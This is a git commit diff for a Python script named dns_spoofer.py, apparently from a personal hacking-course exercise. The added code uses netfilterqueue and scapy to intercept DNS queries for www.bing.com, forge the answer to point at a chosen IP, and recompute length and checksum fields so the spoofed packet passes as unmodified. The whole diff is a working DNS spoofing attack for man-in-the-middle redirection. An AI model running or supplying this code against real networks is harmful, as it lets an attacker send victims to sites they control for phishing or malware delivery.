673e872bf45c7795967b66d5933ac047d5f17379
Brenyn <brenynk@gmail.com>
2020-05-26 03:08:53 -0400

    altered length and checksum fields so spoofed packet appears unmodified

--- dns_spoofer.py
+++ dns_spoofer.py
@@ -9,8 +9,8 @@
 # Input(s): 
 # Output(s): 
 #
-# Notes to self: 
-#
+# Notes to self: scapy_packet[scapy.DNS].ancount
+#				 					  ^layer   ^field
 ##########################################################################################################
 import netfilterqueue
 import scapy.all as scapy
@@ -21,7 +21,19 @@ def process_packet(packet):
 		qname = scapy_packet[scapy.DNSQR].qname #website name is stored in qname variable within DNS Question Record layer
 		if "www.bing.com" in qname: # if the target is visiting the specified website
 			print("[+] Spoofing target")
-			answer = scapy.DNSRR(rrname = qname, rdata = "10.0.2.16") #create a packet that spoofs bing's ip to redirect target where we want ie our kali webserver
+			answer = scapy.DNSRR(rrname = qname, rdata = "172.217.164.228") #create a packet that spoofs bing's ip to redirect target where we want ie our kali webserver (or google in this case because i am too lazy to start my kali webserver)
+			scapy_packet[scapy.DNS].an = answer #replace dns answer field with our spoofed response
+			scapy_packet[scapy.DNS].ancount = 1
+
+			del scapy_packet[scapy.IP].len
+			del scapy_packet[scapy.IP].chksum
+			del scapy_packet[scapy.UDP].len
+			del scapy_packet[scapy.UDP].chksum
+			# if we dont delete the original checksum and length the packet will appear corrupt
+			# when we delete scapy will calculate new length and checksum for our modified response
+
+			packet.set_payload(str(scapy_packet))
+			
 	packet.accept()
 
 queue = netfilterqueue.NetfilterQueue() #redirect traffic through netfilterqueue
